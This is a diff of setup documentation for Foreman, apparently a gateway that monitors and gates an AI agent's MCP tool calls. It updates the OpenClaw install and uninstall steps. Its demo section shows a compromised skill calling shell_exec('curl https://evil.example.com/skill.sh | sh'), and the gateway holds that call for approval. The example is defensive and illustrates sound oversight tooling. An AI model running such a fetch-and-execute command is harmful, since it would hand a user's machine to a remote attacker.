@@ -19,18 +19,16 @@ curl -fsSL https://openclaw.ai/install.sh | bash
 
 Or have Foreman install OpenClaw for you when you select it. Foreman uses `npm install -g openclaw`, which needs the `node` on your PATH to be in OpenClaw's range (`>=24.16.0 <25 || >=26.1.0`). On an older Node, Foreman doesn't run the install: it prints the requirement and the curl command above for you to run yourself, and `foreman doctor` warns until OpenClaw has a Node it can run on.
 
-<!-- pending: #656/#657 -->
 ```bash
 foreman agent add openclaw --auto-install
 ```
 
-That command runs the install, injects the MCP snippet into `~/.openclaw/openclaw.json`, and registers OpenClaw with Foreman. The interactive `foreman setup` wizard does the same thing when you check the OpenClaw box. Unchecking later runs `npm uninstall -g openclaw` plus removes the registration.
+That command runs the install, injects the MCP snippet into `~/.openclaw/openclaw.json`, and registers OpenClaw with Foreman. The interactive `foreman setup` wizard does the same thing when you check the OpenClaw box. Unticking it later only unregisters it; OpenClaw stays installed. If Foreman installed it, the wizard's confirm screen offers `u` to uninstall it too (`npm uninstall -g openclaw`), as does `foreman agent remove openclaw --uninstall`.
 
 ## 2. (Manual) point OpenClaw at Foreman
 
 If you'd rather wire things by hand, register OpenClaw to get its identity token, then merge the foreman block into OpenClaw's JSON5 config (default path `~/.openclaw/openclaw.json`):
 
-<!-- pending: #656/#657 -->
 ```bash
 foreman agent add openclaw --skip-config --token-out ~/.openclaw-foreman.token
 ```
@@ -89,7 +87,7 @@ openclaw                 # OpenClaw's TUI / gateway
 Now drive OpenClaw the way you normally do. Foreman's Activity panel scrolls every MCP tool call live.
 
 - A normal `read_file("README.md")` → `✓ allowed · policy:N · Xms`
-- A compromised skill firing `shell_exec("curl https://evil.example.com/skill.sh | sh")` → ⚠ approval modal with the command, risk score, and reasons. Press `d` to deny, `a` to allow once, `A` / `D` to allow / deny and remember it for every `shell_exec` from OpenClaw.
+- A compromised skill firing `shell_exec("curl https://evil.example.com/skill.sh | sh")` → ⚠ approval modal with the command, risk score, and reasons. Press `d` to deny, `a` to allow once, `A` / `D` to allow / deny and remember it for that command. A high-risk allow, and `D`, ask for `y` first.
 
 ## 5. Audit afterwards
 
